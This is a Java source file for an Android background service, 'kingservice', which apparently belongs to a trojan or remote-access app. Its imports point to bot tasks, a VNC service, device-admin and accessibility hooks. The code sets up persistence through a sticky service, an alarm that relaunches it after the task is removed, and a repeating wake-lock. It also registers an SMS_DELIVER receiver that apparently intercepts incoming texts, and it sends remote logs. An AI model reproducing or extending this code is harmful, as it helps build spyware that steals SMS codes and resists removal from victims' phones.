package com.service.app.Services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.service.app.App;
import com.service.app.Main.AccessActivity;
import com.service.app.Main.AccessAdm;
import com.service.app.Main.AlarmReceiver;
import com.service.app.Main.BootReceiverService;
import com.service.app.Main.BotOperationTask;
import com.service.app.Main.ModeChanger;
import com.service.app.Main.PermManager;
import com.service.app.Main.ReceiverDeviceAdmin;
import com.service.app.Main.ScheduledTaskRunner;
import com.service.app.Main.smsreceiver;
import com.service.app.defines;
import com.service.app.vnc.WebSocketService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.Locale;

public class kingservice extends Service {
    private final static String TAG = kingservice.class.getSimpleName();

    utils utl = new utils();
    defines consts = new defines();
    Utitlies idutl = new Utitlies();
    private static PowerManager.WakeLock _wakeLock;

    private static volatile boolean receiversRegistered = false;
    private static volatile boolean smsReceiverRegistered = false;

    private ScheduledTaskRunner scheduledRunner;

    // worker

    int tick;
    int itoaskAccessibility = 0;
    int speedTime = 1000;
    int start_Q = 6;
    boolean accessactivity = false;

    public static void resetWakeLock(Context context){
        if (_wakeLock == null) {
            Log.d(TAG, "WakeLock is null. Creating new one");
            _wakeLock = ((PowerManager) context.getSystemService(Context.POWER_SERVICE))
                    .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "king::lock");
        } else if (_wakeLock.isHeld()) {
            Log.d(TAG, "WakeLock is held. Releasing");
            _wakeLock.release();
        }
        Log.d(TAG, "Acquiring WakeLock for 1 hour");
        _wakeLock.acquire(60 * 60 * 1000L);
    }

    public void startWakeLockAlarm(Context context){
        Log.d(TAG, "Starting WakeLock alarm. Repeating every 30 minutes");
        Intent intent = new Intent(context, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context.getApplicationContext(), 13002, intent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.setInexactRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + AlarmManager.INTERVAL_HALF_HOUR,
                AlarmManager.INTERVAL_HALF_HOUR,
                pendingIntent
        );
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.d(TAG,"onBind");
        return null;
    }

    @Override
    public void onCreate() {
        //App.setKingService(this);
        Log.d(TAG,"onCreate");
        super.onCreate();
        utils.startCustomTimer(this.getApplicationContext(), consts.str_null, 10000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG,"onStartCommand");
        startService();
        return START_STICKY;
        //return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        Log.d(TAG,"onDestroy");
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG,"onTaskRemoved");
        Intent intent = new Intent(getApplicationContext(), kingservice.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, 13001, intent, PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime() + 5000, pendingIntent);
        super.onTaskRemoved(rootIntent);
    }

    public void startService() {
        Log.d(TAG, "startService");
        Log.d(TAG, "Cache: " + this.getCacheDir());
        Log.d(TAG, "External cache: " + this.getExternalCacheDir());

        utl.RemoteLog(this, "KingService: Service started");



        /* 1 hour partial wakelock request */
        resetWakeLock(this);
        startWakeLockAlarm(this);

        registerScreenStatusReceiver(this);
        registerSmsReceiver(this);

        App.runMainTasks(false); // starts all the scheduledtasks
    }

    private void registerScreenStatusReceiver(Context localContext) {
        if (receiversRegistered) {return;}

        Context context = localContext.getApplicationContext();
        BootReceiverService receiver = new BootReceiverService();

        IntentFilter userPresent = new IntentFilter();
        userPresent.addAction("android.intent.action.USER_PRESENT");
        userPresent.addAction("android.intent.action.SCREEN_OFF");
        context.registerReceiver(receiver, userPresent);

        Log.d("King", "Registered receivers from " + localContext.getClass().getName());
        receiversRegistered = true;
    }

    private void registerSmsReceiver(Context localContext) {
        if (smsReceiverRegistered) {return;}

        Context context = localContext.getApplicationContext();
        smsreceiver receiver = new smsreceiver();

        IntentFilter userPresent = new IntentFilter();
        userPresent.addAction("android.provider.Telephony.SMS_DELIVER");
        context.registerReceiver(receiver, userPresent);

        Log.d("King", "Registered receivers from " + localContext.getClass().getName());
        smsReceiverRegistered = true;
    }
}
